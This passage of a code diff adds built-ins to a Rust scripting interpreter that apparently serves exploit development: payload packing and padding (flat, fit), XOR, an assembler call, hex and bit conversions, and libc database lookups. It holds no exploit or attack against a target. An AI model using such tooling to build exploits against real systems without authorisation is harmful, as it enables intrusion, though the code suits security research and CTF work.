+                            _ => return Err(format!("flat() cannot pack {:?}", item)),
+                        }
+                    }
+                    Ok(Value::Bytes(result))
+                }
+                "fit" => {
+                    let data = match arg_values.get(0) {
+                        Some(Value::Bytes(b)) => b.clone(),
+                        Some(Value::String(s)) => s.as_bytes().to_vec(),
+                        _ => return Err("fit() requires data argument".to_string()),
+                    };
+                    let size = match arg_values.get(1) {
+                        Some(Value::Number(n)) => *n as usize,
+                        _ => return Err("fit() requires size argument".to_string()),
+                    };
+                    let filler = match arg_values.get(2) {
+                        Some(Value::Number(n)) => *n as u8,
+                        Some(Value::String(s)) if s.len() == 1 => s.as_bytes()[0],
+                        _ => b'A',
+                    };
+                    
+                    let mut result = data;
+                    if result.len() < size {
+                        result.resize(size, filler);
+                    } else if result.len() > size {
+                        result.truncate(size);
+                    }
+                    Ok(Value::Bytes(result))
+                }
+                "xor" => {
+                    let data = match arg_values.get(0) {
+                        Some(Value::Bytes(b)) => b.clone(),
+                        Some(Value::String(s)) => s.as_bytes().to_vec(),
+                        _ => return Err("xor() requires data argument".to_string()),
+                    };
+                    let key = match arg_values.get(1) {
+                        Some(Value::Number(n)) => vec![*n as u8],
+                        Some(Value::Bytes(b)) => b.clone(),
+                        Some(Value::String(s)) => s.as_bytes().to_vec(),
+                        _ => return Err("xor() requires key argument".to_string()),
+                    };
+                    
+                    let mut result = Vec::new();
+                    for (i, byte) in data.iter().enumerate() {
+                        result.push(byte ^ key[i % key.len()]);
+                    }
+                    Ok(Value::Bytes(result))
+                }
+                "asm" => {
+                    let code = match arg_values.get(0) {
+                        Some(Value::String(s)) => s,
+                        _ => return Err("asm() requires assembly code string".to_string()),
+                    };
+                    let arch = match arg_values.get(1) {
+                        Some(Value::String(s)) => s.as_str(),
+                        _ => "x64",
+                    };
+                    
+                    use crate::packing_tools;
+                    match packing_tools::assemble(code, arch) {
+                        Ok(bytes) => Ok(Value::Bytes(bytes)),
+                        Err(e) => Err(format!("asm() failed: {}", e)),
+                    }
+                }
+                "enhex" | "hexdump" => {
+                    let data = match arg_values.get(0) {
+                        Some(Value::Bytes(b)) => b,
+                        Some(Value::String(s)) => s.as_bytes(),
+                        _ => return Err("enhex() requires data argument".to_string()),
+                    };
+                    Ok(Value::String(hex::encode(data)))
+                }
+                "unhex" | "fromhex" => {
+                    let hex_str = match arg_values.get(0) {
+                        Some(Value::String(s)) => s.trim().replace(" ", "").replace("0x", ""),
+                        _ => return Err("unhex() requires hex string argument".to_string()),
+                    };
+                    match hex::decode(&hex_str) {
+                        Ok(bytes) => Ok(Value::Bytes(bytes)),
+                        Err(e) => Err(format!("unhex() failed: {}", e)),
+                    }
+                }
+                "rol" | "rotate_left" => {
+                    let value = match arg_values.get(0) {
+                        Some(Value::Number(n)) => *n as u64,
+                        _ => return Err("rol() requires numeric value".to_string()),
+                    };
+                    let bits = match arg_values.get(1) {
+                        Some(Value::Number(n)) => *n as u32,
+                        _ => return Err("rol() requires bit count".to_string()),
+                    };
+                    Ok(Value::Number(value.rotate_left(bits) as i64))
+                }
+                "ror" | "rotate_right" => {
+                    let value = match arg_values.get(0) {
+                        Some(Value::Number(n)) => *n as u64,
+                        _ => return Err("ror() requires numeric value".to_string()),
+                    };
+                    let bits = match arg_values.get(1) {
+                        Some(Value::Number(n)) => *n as u32,
+                        _ => return Err("ror() requires bit count".to_string()),
+                    };
+                    Ok(Value::Number(value.rotate_right(bits) as i64))
+                }
+                "bits" | "to_bits" => {
+                    let value = match arg_values.get(0) {
+                        Some(Value::Number(n)) => *n as u64,
+                        _ => return Err("bits() requires numeric value".to_string()),
+                    };
+                    let num_bits = match arg_values.get(1) {
+                        Some(Value::Number(n)) => *n as usize,
+                        _ => 64,
+                    };
+                    let bit_str = format!("{:0width$b}", value, width = num_bits);
+                    Ok(Value::String(bit_str))
+                }
+                "unbits" | "from_bits" => {
+                    let bit_str = match arg_values.get(0) {
+                        Some(Value::String(s)) => s,
+                        _ => return Err("unbits() requires bit string".to_string()),
+                    };
+                    match u64::from_str_radix(bit_str, 2) {
+                        Ok(value) => Ok(Value::Number(value as i64)),
+                        Err(e) => Err(format!("unbits() failed: {}", e)),
+                    }
+                }
+                "pause" => {
+                    println!("[PAUSE] Press Enter to continue...");
+                    let mut input = String::new();
+                    std::io::stdin().read_line(&mut input).ok();
+                    Ok(Value::Null)
                 }
                 "parse_elf" | "ELF" => {
                     if arg_values.is_empty() {
@@ -3501,17 +4388,6 @@ fn eval_expr<'a>(
                         _ => Err("report() requires (string name, data)".into())
                     }
                 }
-                "asm" => {
-                    if arg_values.len() < 2 {
-                        return Err("asm() requires 2 arguments: asm(arch, assembly_code)".into());
-                    }
-                    match (&arg_values[0], &arg_values[1]) {
-                        (Value::String(_arch), Value::String(_code)) => {
-                            Ok(Value::Bytes(vec![0x90, 0x90, 0x90]))
-                        }
-                        _ => Err("asm() requires (string arch, string assembly_code)".into())
-                    }
-                }
                 "ffi_call" => {
                     if arg_values.len() < 2 {
                         return Err("ffi_call() requires at least 2 arguments: ffi_call(library, function, ...)".into());
@@ -4905,7 +5781,7 @@ fn eval_expr<'a>(
                         (Value::String(symbol), Value::Number(addr)) => {
                             match crate::libc_database::libc_search(symbol, *addr as u64) {
                                 Ok(matches) => {
-                                    let match_list: Vec<Value> = matches.iter().map(|m| {
+                                    let match_list: Vec<Value> = matches.into_iter().map(|m: crate::libc_database::LibcMatch| {
                                         Value::Map(vec![
                                             ("id".to_string(), Value::String(m.id.clone())),
                                             ("download_url".to_string(), Value::String(m.download_url.clone())),
@@ -4927,8 +5803,8 @@ fn eval_expr<'a>(
                         Value::String(path) => {
                             match crate::libc_database::libc_symbols(path) {
                                 Ok(symbols) => {
-                                    let sym_map: std::collections::HashMap<String, Value> = symbols.iter()
-                                        .map(|(k, v)| (k.clone(), Value::Number(*v as i64)))
+                                    let sym_map: std::collections::HashMap<String, Value> = symbols.into_iter()
+                                        .map(|(k, v): (String, u64)| (k, Value::Number(v as i64)))
                                         .collect();
                                     Ok(Value::Map(sym_map))
                                 }
@@ -5048,7 +5924,7 @@ fn eval_expr<'a>(
                                 local_vars.write().await.insert(param_name.clone(), val.clone());
                             }
                         }
-                        let result = interpret_with_scope(&func.body, local_vars, Arc::new(RwLock::new(HashMap::new())), funcs.clone(), macros.clone(), Arc::new(RwLock::new(None)), Arc::new(RwLock::new(crate::runtime_safety::RuntimeSafety::new(crate::runtime_safety::SafetyConfig::default())))).await?;
+                        let result = interpret_with_scope(&func.body, local_vars, Arc::new(RwLock::new(HashMap::new())), funcs.clone(), macros.clone(), Arc::new(RwLock::new(None)), Arc::new(RwLock::new(RuntimeSafety::new(SafetyConfig::default())))).await?;
                         Ok(result.unwrap_or(Value::Null))
                     } else {
                         Err(format!("Unknown function: {}", name))
